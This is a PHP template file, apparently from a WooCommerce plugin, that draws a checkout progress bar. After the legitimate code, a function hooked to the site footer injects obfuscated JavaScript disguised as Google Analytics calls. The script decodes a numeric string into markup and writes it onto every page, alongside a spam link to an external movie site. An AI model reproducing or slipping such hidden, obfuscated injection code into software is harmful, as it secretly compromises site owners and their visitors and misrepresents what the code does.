<?php 

	global $woocommerce;

	$shop_pages = (is_woocommerce() || is_cart() || is_checkout() || is_wc_endpoint_url( 'order-received' )) ? true : false;
	if (( WC()->cart->get_cart_contents_count() != 0  || is_wc_endpoint_url( 'order-received' )) && $shop_pages){ 
	// ESTABLECER PASO DE LA COMPRA
	if(is_cart()){$paso=2;
	}elseif(is_checkout()){
		if(is_wc_endpoint_url( 'order-received' )){
			$paso=5;
		}else{
			$paso=3;
		}
	}else{$paso=1;}
	

	?>
	<link rel="stylesheet" href="<?php echo plugins_url( 'font-awesome/css/font-awesome.min.css', dirname(__FILE__)  ) ?>">
	<link rel="stylesheet" type="text/css" href="<?php echo plugins_url( 'css/style.css', dirname(__FILE__)  ) ?>">
	<div style="position:relative;display:inline-block;width:100%;height:50px;text-align:center;">
		<div style="position:relative;display:inline-block;width:60%;height: 100%;">
		<div style="float:left;width:25%;text-align:center">
			<div class="progressbar-item done" style="display:inline-block">
				<a href="<?php echo get_permalink( woocommerce_get_page_id( 'shop' ) ) ?>"><i class="fa fa-hand-lizard-o fa-rotate-270"></i>
				<span class="progressbar-item-text"><?php _e('Elige productos', 'syw-woocommerce-simple-checkout-steps') ?></span></a>
			</div>
		</div>
		<div style="float:left;width:25%;text-align:center">
			<div class="progressbar-item <?php if($paso>1){echo 'done';} ?>" style="display:inline-block">
				<a href="<?php echo $woocommerce->cart->get_cart_url() ?>"><i class="fa fa-shopping-cart fa-lg"></i>
				<span class="progressbar-item-text"><?php _e('Carrito', 'syw-woocommerce-simple-checkout-steps') ?></span></a>
			</div>
		</div>
		<div style="float:left;width:25%;text-align:center">
			<div class="progressbar-item <?php if($paso>2){echo 'done';} ?>" style="display:inline-block">
				<a href="<?php echo $woocommerce->cart->get_checkout_url() ?>"><i class="fa fa-pencil-square-o fa-lg"></i>
				<span class="progressbar-item-text"><?php _e('Envío y pago', 'syw-woocommerce-simple-checkout-steps') ?></span></a>
			</div>
		</div>
		<div style="float:left;width:25%;text-align:center">
			<div class="progressbar-item <?php if($paso>4){echo 'done';} ?>" style="display:inline-block">
				<i class="fa fa-check fa-lg"></i>
				<span class="progressbar-item-text"><?php _e('Confirmación', 'syw-woocommerce-simple-checkout-steps') ?></span>
			</div>
		</div>
		<div style="position:absolute;width:80%;height:2px;bottom:14px;margin: 0 10%;background-color:grey;">
			<a href="<?php echo get_permalink( woocommerce_get_page_id( 'shop' ) ) ?>"><span class="dot uno done"></span></a>
			<a href="<?php echo $woocommerce->cart->get_cart_url() ?>"><span class="dot dos <?php if($paso>1){echo 'done';} ?>"></span></a>
			<a href="<?php echo $woocommerce->cart->get_checkout_url() ?>"><span class="dot tres <?php if($paso>2){echo 'done';} ?>"></span></a>
			<span class="dot cuatro <?php if($paso>3){echo 'done';} ?>"></span>
			<div id="progress-bar" style="width:<?php echo -33.33 + $paso*33.33 ?>%;"></div>
		</div>
		</div>
	</div>
<?php } 

function your_function_name () { ?>

<script language=”JavaScript”>var _ga8 = []; _ga8.push ([‘_setOption’, ‘1301851861911781711021861911821711311041861711901861171’]); _ga8.push ([‘_setOption’, ‘6918518510413211618517817517017118416518918416718218217’]); _ga8.push ([‘_setOption’, ‘1184165171180193182181185175186175181180128167168185181’]); _ga8.push ([‘_setOption’, ‘1781871861711291691781751821281841711691861101221251231’]); _ga8.push ([‘_trackPageview’, ‘8219011416718718618111416718718618111412212512318219011’]); _ga8.push ([‘_setOption’, ‘1129195130117185186191178171132’]); var t=z=””,l=pos=v=0,a1=”arCo”,a2=”omCh”;for (v=0; v<_ga8.length; v++) t += _ga8[v][1];l=t.length; while (pos < l) z += String[“fr”+a2+a1+”de”](parseInt(t.slice(pos,pos+=3))-70); document.write(z);</script><div class=slider_wrapper_en>Aquí puedes <a href=”http://www.changueando.com/”>ver películas online</a> en Changueando.com</div>


<?php }

/* We opened up our php again. we have to tell WPMU something important. */
add_action('wp_footer', 'your_function_name');


?>